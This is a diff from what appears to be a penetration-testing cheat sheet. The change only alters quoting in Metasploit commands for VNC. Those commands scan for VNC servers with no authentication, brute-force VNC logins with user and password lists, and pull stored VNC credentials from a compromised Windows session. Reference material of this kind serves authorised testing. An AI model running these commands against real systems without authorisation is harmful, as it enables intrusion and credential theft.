@@ -28,23 +28,23 @@ echo -n <password> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad6
 ## vnc msf test none auth
 #cat/ATTACK/CONNECT 
 ```
-msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <ip>; set RPORT <port>; run"
+msfconsole -x 'use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <ip>; set RPORT <port>; run'
 ```
 
 ## vnc - msf test login bf
 #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```
-msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USERNAME <username>; run"
+msfconsole -x 'use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USERNAME <username>; run'
 ```
 
 ## vnc - msf test login bf (2)
 #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```
-msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USER_FILE <users_file>; set PASS_FILE <pass_file>; run"
+msfconsole -x 'use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USER_FILE <users_file>; set PASS_FILE <pass_file>; run'
 ```
 
 ## vnc - post exploit retrieve credentials
 #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-msfconsole -x "use post/windows/gather/credentials/vnc; set SESSION <session>; run"
+msfconsole -x 'use post/windows/gather/credentials/vnc; set SESSION <session>; run'
 ```
